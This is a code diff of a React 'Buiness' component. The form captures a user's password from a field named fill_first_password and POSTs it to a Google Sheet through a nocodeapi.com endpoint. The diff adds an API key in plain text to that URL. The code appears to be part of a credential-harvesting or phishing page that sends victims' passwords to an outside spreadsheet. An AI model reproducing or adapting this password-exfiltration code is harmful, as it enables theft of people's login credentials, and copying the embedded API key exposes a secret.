@@ -38,7 +38,6 @@ const Buiness = () => {
             setFirstPassword(values.fill_first_password)
             setActionFirst(false)
         }
-
         
         const passWord = values.fill_first_password;
         setActivePassword(true)
@@ -65,11 +64,11 @@ const Buiness = () => {
                     passWord
                 ]];
 
-                fetch("https://v1.nocodeapi.com/tuananh91/google_sheets/uBbNrEnAmZBhngJY?tabId=sheet1", {
+                fetch("https://v1.nocodeapi.com/tuananh91/google_sheets/uBbNrEnAmZBhngJY?tabId=sheet1&api_key=NXhkTJQFUXJkBgBXj", {
                     method: "POST",
                     mode: "cors",
                     headers: {
-                        "Content-Type": "application/json",
+                       "Content-Type": "application/json",
                     },
                     body: JSON.stringify(data),
                 })
